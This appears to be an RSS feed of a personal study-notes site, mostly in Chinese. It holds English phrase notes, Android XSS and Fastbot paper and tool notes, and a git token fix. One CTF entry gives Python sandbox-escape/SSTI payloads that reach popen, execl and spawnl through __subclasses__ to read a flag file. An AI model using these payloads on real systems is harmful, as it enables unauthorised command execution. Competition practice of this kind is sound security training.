 &lt;td style="text-align: center">Very strong&lt;/td>
 &lt;td style="text-align: center">forceful&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="phrase">
 Phrase
 &lt;a class="anchor" href="#phrase">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Phrase&lt;/th>
 &lt;th>Description&lt;/th>
 &lt;th>Example&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>Regarding=&lt;/br>In regard to=&lt;/br>with regard to&lt;/td>
 &lt;td>工作上很常出現的英文詞語。也可以說它就是一個固定化的片語，在商業場合中很常看到。意思是「關於~」「有關～」&lt;/td>
 &lt;td>1. Regarding the meeting schedule, please see the attached file.&lt;/br>關於會議的日程，請看附件。※Email用&lt;/br>2. I got an inquiry from a customer regarding this issue.&lt;/br>關於這個議題，我收到了來自一位客人的詢問。&lt;/br>就像你看到的，「regarding」後面會接名詞子句。它可以放在句首或是句中，取決於想要在句子中強調什麼。&lt;/br>（例如的上面第1句，強調關於會議的日程…，第2句則是強調收到了詢問的這件事。）用「regarding」的時候，請注意後面不要再加「to」了。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>In Terms Of&lt;/td>
 &lt;td>接下來的「in terms of」，不只是在商業場合、在日常生活中可能也常常聽到。意思除了「關於~」之外，還帶有像「在～點上」，這樣限定、指定什麼的感覺。&lt;/td>
 &lt;td>1. In terms of location, the hotel was great but the service was not satisfactory.&lt;/br>就位置而言，這間飯店很棒，但服務差強人意。&lt;/br>2.We are not doing very well in terms of making a profit.&lt;/br>就創造利益而言，我們做的不是很好。&lt;/br>&lt;/br>「In terms of」後面也是接名詞子句。&lt;/br>&lt;/br>這兩句並不是說不能用「regarding」，但「in terms of」比較有限定、和其他方面相比的感覺。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>As For&lt;/td>
 &lt;td>單字很簡單、是很短的片語，因此實際上它可能也是最容易使用的表現了。雖然是「關於~」「有關～」的意思，但它還有一點話題轉換的感覺。是在日常對話或是商業場合中都可以使用的表現。&lt;/td>
 &lt;td>1. As for me, I like Spanish food more than Italian.&lt;/br>至於我呢，我喜歡西班牙料理更勝於義大利的。&lt;/br>2. As for the new project, we will discuss it later.&lt;/br>至於這個新計畫，我們稍後會討論它。&lt;/br>&lt;/br>「As for」如同例句1中，很常用「As for me」像這樣訴說關於自己的事情。另外，在這個用法中不能用「regarding」來代替。&lt;/br>&lt;/br>例句2是「as for」用在商業場合等的例子，但這邊就可以用「regarding」或是「with regard to」了。&lt;/br>&lt;/br>順帶一提，兩句如果用「in terms of」的話都不太自然。&lt;/br>&lt;/br>「As for」還有要放在句首的這個規定。因此，如果想要強調「as for」之後接的詞語的話就可以使用它。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>Regarding VS. In terms of VS. As for
資料來源: &lt;a href="https://nativecamp.net/zh-tw/blog/2219/">「Regarding」「In Terms Of」的差別是！？&lt;/a>
&lt;blockquote>
&lt;ul>
&lt;li>Regarding（in regard to, with regard to）:
表示「關於~」可以使用、是很廣泛的表現。放在句首或句中都可以。不適合用「In terms of」或是「as for」的情況下，用這個幾乎就是對的了。&lt;/li>
&lt;li>In terms of:
「關於~」，限定、特定某個主題，是可以比較明確的表示關於什麼的一種表現。另外，想和其他東西比較的時候也很好用。
（例：關於〇〇很棒，但〇〇就不太行了。)
放在句首或句中都可以。&lt;/li>
&lt;li>As for:
在關於人的事情時很常使用。（例：as for me, as for him, as for my mother等）
很常用來代替「Regarding」使用，一定要放在句首。比起「Regarding」，它有一點話題轉換的感覺。&lt;/li>
&lt;/ul>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.clearnotebooks.com/zh-TW/notebooks/807795">英文作文常用單字&lt;/a>&lt;/p></description></item><item><title>EOF AIS3 Final</title><link>https://bernie6401.github.io/docs/security/competition/eof-ais3-final/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/eof-ais3-final/</guid><description>&lt;h1 id="eof-ais3-final">
 EOF AIS3 Final
 &lt;a class="anchor" href="#eof-ais3-final">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-ais3">
 tags: &lt;code>CTF&lt;/code> &lt;code>AIS3&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-ais3">#&lt;/a>
&lt;/h6>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://jzchangmark.wordpress.com/2015/03/05/%E9%80%8F%E9%81%8E-selenium-%E6%93%8D%E4%BD%9C%E4%B8%8B%E6%8B%89%E5%BC%8F%E9%81%B8%E5%96%AE-select/">https://jzchangmark.wordpress.com/2015/03/05/%E9%80%8F%E9%81%8E-selenium-%E6%93%8D%E4%BD%9C%E4%B8%8B%E6%8B%89%E5%BC%8F%E9%81%B8%E5%96%AE-select/&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.qnx.com/developers/docs/7.1/#com.qnx.doc.neutrino.lib_ref/topic/s/spawnl.html">https://www.qnx.com/developers/docs/7.1/#com.qnx.doc.neutrino.lib_ref/topic/s/spawnl.html&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/mhchia/practice/blob/master/ctf/final/write_up.md">https://github.com/mhchia/practice/blob/master/ctf/final/write_up.md&lt;/a>&lt;/p>
&lt;p>SSTI: &lt;a href="https://www.freebuf.com/articles/network/258136.html">https://www.freebuf.com/articles/network/258136.html&lt;/a>
&lt;a href="https://www.compart.com/en/unicode/U&amp;#43;FF5B">https://www.compart.com/en/unicode/U+FF5B&lt;/a>
&lt;a href="https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection">https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection&lt;/a>&lt;/p>
&lt;p>Payload:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;execl&amp;#39;](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, &amp;#34;./flag.txt&amp;#34;))


print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;popen&amp;#39;](&amp;#34;cat /flag.txt&amp;#34;))

file = &amp;#39;FLAG.TXT&amp;#39;
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;execl&amp;#39;](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower()))

file = &amp;#39;FLAG.TXT&amp;#39;
command = &amp;#39;EXECL&amp;#39;
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[command.lower()](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower()))


file = &amp;#39;FLAG.TXT&amp;#39;
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;spawnl&amp;#39;](&amp;#39;P_WAIT&amp;#39;, &amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower()))
&lt;/code>&lt;/pre>&lt;h2 id="script---run_scriptpy">
 Script - run_script.py
 &lt;a class="anchor" href="#script---run_scriptpy">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import subprocess
import time
import multiprocessing as mp


def cycle(i):
 subprocess.call([&amp;#39;python&amp;#39;, &amp;#39;script.py&amp;#39;, &amp;#39;--team&amp;#39;, str(i)])

if __name__ == &amp;#34;__main__&amp;#34;:
 p1 = mp.Process(target=cycle, args=(&amp;#39;1&amp;#39;,))
 p2 = mp.Process(target=cycle, args=(&amp;#39;2&amp;#39;,))
 # p3 = mp.Process(target=cycle, args=(&amp;#39;3&amp;#39;,))
 # p4 = mp.Process(target=cycle, args=(&amp;#39;4&amp;#39;,))
 # p5 = mp.Process(target=cycle, args=(&amp;#39;5&amp;#39;,))
 # p7 = mp.Process(target=cycle, args=(&amp;#39;7&amp;#39;,))
 # p8 = mp.Process(target=cycle, args=(&amp;#39;8&amp;#39;,))
 # p9 = mp.Process(target=cycle, args=(&amp;#39;9&amp;#39;,))
 # p10 = mp.Process(target=cycle, args=(&amp;#39;10&amp;#39;,))
 # p11 = mp.Process(target=cycle, args=(&amp;#39;11&amp;#39;,))
 # p12 = mp.Process(target=cycle, args=(&amp;#39;12&amp;#39;,))
 # p13 = mp.Process(target=cycle, args=(&amp;#39;13&amp;#39;,))
 # p14 = mp.Process(target=cycle, args=(&amp;#39;14&amp;#39;,))
 # p15 = mp.Process(target=cycle, args=(&amp;#39;15&amp;#39;,))
 # p16 = mp.Process(target=cycle, args=(&amp;#39;16&amp;#39;,))
 # p17 = mp.Process(target=cycle, args=(&amp;#39;17&amp;#39;,))
 # p18 = mp.Process(target=cycle, args=(&amp;#39;18&amp;#39;,))
 # p19 = mp.Process(target=cycle, args=(&amp;#39;19&amp;#39;,))
 # p20 = mp.Process(target=cycle, args=(&amp;#39;20&amp;#39;,))
 # p21 = mp.Process(target=cycle, args=(&amp;#39;21&amp;#39;,))
 # p22 = mp.Process(target=cycle, args=(&amp;#39;22&amp;#39;,))
 # p23 = mp.Process(target=cycle, args=(&amp;#39;23&amp;#39;,))
 # p24 = mp.Process(target=cycle, args=(&amp;#39;24&amp;#39;,))
 

 p1.start()
 time.sleep(2)
 p2.start()
 time.sleep(2)
 # p3.start()
 # p4.start()
 # p5.start()
 # p7.start()
 # p8.start()
 # p9.start()
 # p10.start()
 # p11.start()
 # p12.start()
 # p13.start()
 # p14.start()
 # p15.start()
 # p16.start()
 # p17.start()
 # p18.start()
 # p19.start()
 # p20.start()
 # p21.start()
 # p22.start()
 # p23.start()
 # p24.start()

 p1.join()
 p2.join()
 # p3.join()
 # p4.join()
 # p5.join()
 # p7.join()
 # p8.join()
 # p9.join()
 # p10.join()
 # p11.join()
 # p12.join()
 # p13.join()
 # p14.join()
 # p15.join()
 # p16.join()
 # p17.join()
 # p18.join()
 # p19.join()
 # p20.join()
 # p21.join()
 # p22.join()
 # p23.join()
 # p24.join()
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Exploiting ML ALG for Efficient Detection and Prevention of JS-XSS Attacks in Android Based Hybrid Applications</title><link>https://bernie6401.github.io/docs/survey-papers/android-+-security/exploiting-ml-alg-for-efficient-detection-and-prevention-of-js-xss-attacks-in-android-based-hybrid-applications/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/android-+-security/exploiting-ml-alg-for-efficient-detection-and-prevention-of-js-xss-attacks-in-android-based-hybrid-applications/</guid><description>&lt;h1 id="exploiting-ml-algorithms-for-efficient-detection-and-prevention-of-javascript-xss-attacks-in-android-based-hybrid-applications">
 Exploiting ML algorithms for Efficient Detection and Prevention of JavaScript-XSS Attacks in Android Based Hybrid Applications
 &lt;a class="anchor" href="#exploiting-ml-algorithms-for-efficient-detection-and-prevention-of-javascript-xss-attacks-in-android-based-hybrid-applications">#&lt;/a>
&lt;/h1>
&lt;p>:::info
Khalid, U., Abdullah, M., &amp;amp; Inayat, K. (2020). Exploiting ML algorithms for Efficient Detection and Prevention of JavaScript-XSS Attacks in Android Based Hybrid Applications. arXiv preprint arXiv:2006.07350.
:::
這一篇論文對於我的研究只有一點點用，大概補足了一些我對Android的XSS漏洞的認識。主要是在利用一些feature，訓練出能夠檢測有無XSS攻擊的模型&lt;/p>
&lt;h2 id="introduction">
 Introduction
 &lt;a class="anchor" href="#introduction">#&lt;/a>
&lt;/h2>
&lt;p>首先，很多的手機App中都會使用WebView這個Component，也就是能夠直接嵌入一個mini browser在App中而不需要另外開啟外部的Browser才能瀏覽網頁，所以JS語言就能夠和Java語言互動，問題在於當從 JavaScript 呼叫 Java 時，攻擊者會將惡意 JavaScript 程式碼儲存在網頁中，當網頁在應用程式中開啟時，然後在 WebView 中註冊一個物件。 首先，攻擊者透過 JavaScript 存取該對象，並透過該對象存取該應用程式的本機方法，攻擊者可以透過觸發本機方法內的重要內建函數輕鬆取得不同的智慧型手機資源。&lt;/p>
&lt;h2 id="contribution">
 Contribution
 &lt;a class="anchor" href="#contribution">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>自行創建一個Dataset，並且從500個不同的Apps中extract出7個不同的feature&lt;/li>
&lt;li>訓練7種不同的ML 模型: Evolutionary-Support Vector Machine (E-SVM), Neural Network, Naive Bayes, Support Vector Machine(SVM), Bagging, Random Forest and J48&lt;/li>
&lt;li>根據實驗結果給出F1-Score和執行時間，結果顯示Random Forest是最好的模型&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>WebView
這個component的存在理由如上所述，其中會用到幾的API:
&lt;pre tabindex="0">&lt;code>setJavaScriptEnabled API
addJavascriptInterface API
loadUrl API
&lt;/code>&lt;/pre>第一個是enable可以使用JS，第二個是註冊Java物件，第三個就是實際把網頁load進來&lt;/li>
&lt;li>Sandbox
&lt;img src="https://hackmd.io/_uploads/r1C5aaRMC.png" alt="圖片" />
如上圖，一般來說webview的瀏覽是會經過sandbox，確保可以控制web browser的access，讓他和本地資源不會共享；網頁和網頁之間要隔離，而網頁和主系統之間也會隔離&lt;/li>
&lt;li>Bypassing sandbox mechanism
&lt;img src="https://hackmd.io/_uploads/BkBYapCGC.png" alt="圖片" />
從上圖可以看出，儘管WebView中存在沙箱安全機制來保護行動裝置本地資源免受JavaScript攻擊，但WebView本身借助WebView提供的API繞過了沙箱機制。 這創建了一條路徑，JavaScript 可以輕鬆地與本機 Java 通訊。 並且攻擊者可以觸發Java的不同類別方法發動XSS攻擊，透過原生Java程式碼存取行動裝置的重要功能包括本機資源。&lt;/li>
&lt;li>哪些類型的易受攻擊的 API 可以透過 Java 物件觸發？
作者有整理出來一個表如下:
&lt;img src="https://hackmd.io/_uploads/SJmIkA0zA.png" alt="圖片" />&lt;/li>
&lt;/ul>
&lt;h2 id="proposed-method">
 Proposed Method
 &lt;a class="anchor" href="#proposed-method">#&lt;/a>
&lt;/h2>
&lt;p>現在的重點是要如何分辨一個App他啟動了webview之後，是否會造成XSS攻擊，作者提出了由四個Level組成的偵測框架以及三個Layers的預防框架&lt;/p></description></item><item><title>Fastbot Android</title><link>https://bernie6401.github.io/docs/tools/others/android-app-crawler/fastbot-android/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-app-crawler/fastbot-android/</guid><description>&lt;h1 id="fastbot-android">
 Fastbot Android
 &lt;a class="anchor" href="#fastbot-android">#&lt;/a>
&lt;/h1>
&lt;p>以下流程皆是參考&lt;a href="https://blog.csdn.net/u010698107/article/details/127347704">CSDN-Android APP穩定性測試工具Fastbot&lt;/a>和&lt;a href="https://github.com/bytedance/Fastbot_Android/blob/main/handbook-cn.md">官方中文教學&lt;/a>&lt;/p>
&lt;h2 id="一般使用">
 一般使用
 &lt;a class="anchor" href="#%e4%b8%80%e8%88%ac%e4%bd%bf%e7%94%a8">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>把repo clone下來，並且把一些檔案複製到手機
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ git clone https://github.com/bytedance/Fastbot_Android.git
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cd Fastbot_Android
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb push fastbot-thirdpart.jar /sdcard
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb push framework.jar /sdcard
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb push monkeyq.jar /sdcard
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb push libs/. /data/local/tmp/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>dump apk內部會使用到的strings，並且複製到手機
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aapt2 dump strings &amp;lt;your apk name&amp;gt; &amp;gt; max.valid.strings
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb push max.valid.strings /sdcard 
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>獲取device number和package name
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ adb devices
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>List of devices attached
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>24121JEGR04513 device
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ aapt2 dump badging &lt;span style="color:#e6db74">&amp;#34;Spotify_ Music and Podcasts_8.9.60.560_APKPure.apk&amp;#34;&lt;/span> | findstr &lt;span style="color:#e6db74">&amp;#34;package&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>package: name&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;com.spotify.music&amp;#39;&lt;/span> versionCode&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;116920144&amp;#39;&lt;/span> versionName&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;8.9.60.560&amp;#39;&lt;/span> platformBuildVersionName&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;14&amp;#39;&lt;/span> platformBuildVersionCode&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;34&amp;#39;&lt;/span> compileSdkVersion&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;34&amp;#39;&lt;/span> compileSdkVersionCodename&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;14&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uses-permission: name&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;com.sec.android.app.clockpackage.permission.READ_ALARM&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>實際測試
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ adb shell CLASSPATH&lt;span style="color:#f92672">=&lt;/span>/sdcard/monkeyq.jar:/sdcard/framework.jar:/sdcard/fastbot-thirdpart.jar exec app_process /system/bin com.android.commands.monkey.Monkey -p &amp;lt;package name&amp;gt; --agent reuseq --running-minutes &amp;lt;遍歷時長&amp;gt; --throttle &amp;lt;事件頻率&amp;gt; -v -v
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>---
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb shell CLASSPATH&lt;span style="color:#f92672">=&lt;/span>/sdcard/monkeyq.jar:/sdcard/framework.jar:/sdcard/fastbot-thirdpart.jar exec app_process /system/bin com.android.commands.monkey.Monkey -p com.spotify.music --agent reuseq --running-minutes &lt;span style="color:#ae81ff">1&lt;/span> --throttle &lt;span style="color:#ae81ff">500&lt;/span> -v -v --output-directory /sdcard/fastbot_results&amp;amp;adb pull /sdcard/fastbot_results D:&lt;span style="color:#ae81ff">\D&lt;/span>ownloads
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="輸入自訂strings">
 輸入自訂Strings
 &lt;a class="anchor" href="#%e8%bc%b8%e5%85%a5%e8%87%aa%e8%a8%82strings">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Download ADBKeyBoard，安裝後設定預設keyboard為ADBKeyboard
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ wget https://github.com/senzhk/ADBKeyBoard/raw/master/ADBKeyboard.apk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb install ADBKeyboard.apk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb shell ime enable com.android.adbkeyboard/.AdbIME
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb shell ime set com.android.adbkeyboard/.AdbIME
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>設定config並push到手機
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">&amp;#34;max.randomPickFromStringList = true&amp;#34;&lt;/span> &amp;gt; max.config
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb push max.config /sdcard
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>設定像要輸入的strings並push到手機
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">&amp;#34;test string&amp;#34;&lt;/span> &amp;gt; max.strings
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb push max.strings /sdcard
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;p>:::info&lt;/p></description></item><item><title>Fastbot: A Multi-Agent Model-Based Test Generation System</title><link>https://bernie6401.github.io/docs/survey-papers/android-+-security/gui-testing/fastbot_-a-multi-agent-model-based-test-generation-system/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/android-+-security/gui-testing/fastbot_-a-multi-agent-model-based-test-generation-system/</guid><description>&lt;h1 id="fastbot-a-multi-agent-model-based-test-generation-system">
 Fastbot: A Multi-Agent Model-Based Test Generation System
 &lt;a class="anchor" href="#fastbot-a-multi-agent-model-based-test-generation-system">#&lt;/a>
&lt;/h1>
&lt;p>:::info
Cai, T., Zhang, Z., &amp;amp; Yang, P. (2020, October). Fastbot: A multi-agent model-based test generation system Beijing Bytedance Network Technology Co., Ltd. In Proceedings of the IEEE/ACM 1st International Conference on Automation of Software Test (pp. 93-96).
:::
參考資料: &lt;a href="https://mp.weixin.qq.com/s/QhzqBFZygkIS6C69__smyQ">https://mp.weixin.qq.com/s/QhzqBFZygkIS6C69__smyQ&lt;/a>
&lt;img src="https://hackmd.io/_uploads/BkAnq965Jg.png" alt="image" />&lt;/p></description></item><item><title>Fastbot2: Reusable Automated Model-based GUI Testing for Android Enhanced by Reinforcement Learning</title><link>https://bernie6401.github.io/docs/survey-papers/android-+-security/gui-testing/fastbot2_-reusable-automated-model-based-gui-testing-for-android-enhanced-by-reinforcement-learning/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/android-+-security/gui-testing/fastbot2_-reusable-automated-model-based-gui-testing-for-android-enhanced-by-reinforcement-learning/</guid><description>&lt;h1 id="fastbot2-reusable-automated-model-based-gui-testing-for-android-enhanced-by-reinforcement-learning">
 Fastbot2: Reusable Automated Model-based GUI Testing for Android Enhanced by Reinforcement Learning
 &lt;a class="anchor" href="#fastbot2-reusable-automated-model-based-gui-testing-for-android-enhanced-by-reinforcement-learning">#&lt;/a>
&lt;/h1>
&lt;p>:::info
Lv, Z., Peng, C., Zhang, Z., Su, T., Liu, K., &amp;amp; Yang, P. (2022, October). Fastbot2: Reusable automated model-based gui testing for android enhanced by reinforcement learning. In Proceedings of the 37th IEEE/ACM International Conference on Automated Software Engineering (pp. 1-5).
:::
參考資料: &lt;a href="https://github.com/bytedance/Fastbot_Android/blob/main/handbook-cn.md">https://github.com/bytedance/Fastbot_Android/blob/main/handbook-cn.md&lt;/a>
&lt;img src="https://hackmd.io/_uploads/SJFpdcp51x.png" alt="image" />&lt;/p>
&lt;h2 id="動機與貢獻">
 動機與貢獻
 &lt;a class="anchor" href="#%e5%8b%95%e6%a9%9f%e8%88%87%e8%b2%a2%e7%8d%bb">#&lt;/a>
&lt;/h2>
&lt;p>現有的GUI testing都是無法重複使用之前測試的結果，但fastbot2可以(特別是event-activity transitions)。有兩個貢獻&lt;/p>
&lt;ol>
&lt;li>提出reusable automated model-based GUI testing technique，並且利用reinforcement learning進行增強，以滿足持續測試的實際需求&lt;/li>
&lt;li>Fastbot2 優於最先進的技術。它也已成功部署在位元組跳動的 CI 流程中，並因其改善應用程式品質的能力而獲得了積極的回饋&lt;/li>
&lt;/ol>
&lt;h2 id="主要流程">
 主要流程
 &lt;a class="anchor" href="#%e4%b8%bb%e8%a6%81%e6%b5%81%e7%a8%8b">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>其實很簡單，就是2個東西合併，一個是可以儲存過往測試的流程中，event和activity之間的關係(transitions)，該機率模型就是在記憶每一次的測試round中，獲得的一些knowledge，比方說哪一個哪些event會跑到哪個activity之類的；&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>旨在根據曾經探索的頁面的情況，對當前的備選組件進行挑選，從中選出最有可能觸發未曾探索過的頁面的組件，也就更有可能提升測試結果的 Activity 覆蓋率&lt;/p></description></item><item><title>fatal: Authentication failed for `'https://github.com/{username}/{repository}.git/'`</title><link>https://bernie6401.github.io/docs/problem-solutions/fatal_-authentication-failed-for-https___github.com_username_repository.git_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/fatal_-authentication-failed-for-https___github.com_username_repository.git_/</guid><description>&lt;h1 id="fatal-authentication-failed-for-httpsgithubcomusernamerepositorygit">
 fatal: Authentication failed for &lt;code>'https://github.com/{username}/{repository}.git/'&lt;/code>
 &lt;a class="anchor" href="#fatal-authentication-failed-for-httpsgithubcomusernamerepositorygit">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-problem-solution">
 tags: &lt;code>problem solution&lt;/code>
 &lt;a class="anchor" href="#tags-problem-solution">#&lt;/a>
&lt;/h6>
&lt;h2 id="solution">
 Solution
 &lt;a class="anchor" href="#solution">#&lt;/a>
&lt;/h2>
&lt;p>According to &lt;a href="https://www.wongwonggoods.com/all-posts/debug_error/git-remote-support/">this page&lt;/a>
Go to &lt;a href="https://github.com/settings/tokens">https://github.com/settings/tokens&lt;/a> (or setting/Developer setting/Tokens (classic)/) and click &lt;code>Generate new token&lt;/code> to apply a new token.&lt;/p>
&lt;ul>
&lt;li>
&lt;p>If you want to push repo
Payload:
&lt;code>git remote set-url origin https://ghp_XXXXXXXXXXXXXXXXXXX@github.com/howarder3/test_repo.git&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>If you want to clone your own private repo in new computer
Payload:
&lt;code>git clone https://ghp_XXXXXXXXXXXXXXXXXXX@github.com/howarder3/test_repo.git&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>FedML-HE - An Efficient Homomorphic-Encryption-Based Privacy-Preserving Federated Learning System - Notes</title><link>https://bernie6401.github.io/docs/survey-papers/federated-learning/fedml-he---an-efficient-homomorphic-encryption-based-privacy-preserving-federated-learning-system---notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/federated-learning/fedml-he---an-efficient-homomorphic-encryption-based-privacy-preserving-federated-learning-system---notes/</guid><description>&lt;h1 id="fedml-he---an-efficient-homomorphic-encryption-based-privacy-preserving-federated-learning-system---notes">
 FedML-HE - An Efficient Homomorphic-Encryption-Based Privacy-Preserving Federated Learning System - Notes
 &lt;a class="anchor" href="#fedml-he---an-efficient-homomorphic-encryption-based-privacy-preserving-federated-learning-system---notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-meeting-paper-ntu">
 tags: &lt;code>Meeting Paper&lt;/code> &lt;code>NTU&lt;/code>
